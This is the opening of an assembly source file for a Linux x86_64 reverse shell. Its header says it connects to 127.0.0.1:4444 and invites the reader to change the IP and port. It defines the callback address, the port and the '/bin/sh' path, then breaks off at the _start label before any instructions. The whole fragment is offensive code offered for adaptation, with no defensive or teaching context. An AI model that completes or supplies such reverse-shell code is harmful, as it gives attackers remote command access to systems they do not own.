; Linux x86_64 Reverse Shell Assembly
; Connects to 127.0.0.1:4444 (change IP and port as needed)

section .data
    ip_addr     db 127,0,0,1          ; IP address 127.0.0.1
    port        dw 0x5c11             ; Port 4444 in network byte order (0x115c little endian)
    shell       db '/bin/sh',0

section .bss
    sockfd      resd 1

section .text
    global _start

_start:
